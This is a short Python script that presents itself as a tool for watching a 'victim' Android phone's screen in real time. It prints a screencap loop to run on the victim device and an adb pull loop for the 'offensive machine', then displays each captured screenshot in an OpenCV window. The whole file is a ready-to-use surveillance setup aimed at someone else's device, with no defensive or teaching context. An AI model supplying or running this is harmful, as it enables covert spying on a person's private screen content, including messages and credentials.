import cv2
import os
import time

os.system("clear")
print("please place this payload on offensive machine : while true; do adb pull /sdcard/a.png; rm a.png; done  ")
print("please place this payload on victim android phone : while [ true ]; do screencap -p /sdcard/a.png ; done;  ")
input("press enter when it's done.... ")



def display_realtime_image(image_path):
    while True:
        if os.path.exists(image_path):
            image = cv2.imread(image_path)
            if image is not None:  
                resized_image = cv2.resize(image, (0, 0), fx=0.33, fy=0.33)
                cv2.imshow("Real-time Image", resized_image)
            else:
                print(f"Unable to load image {image_path}.")
        else:
            print(f"Image {image_path} not found.")
        
        if cv2.waitKey(1) == 27:
            break

    cv2.destroyAllWindows()


folder_path = input("Entrez le chemin du dossier contenant l'image : ")
image_name = "a.png"
image_path = folder_path + "/" + image_name

display_realtime_image(image_path)


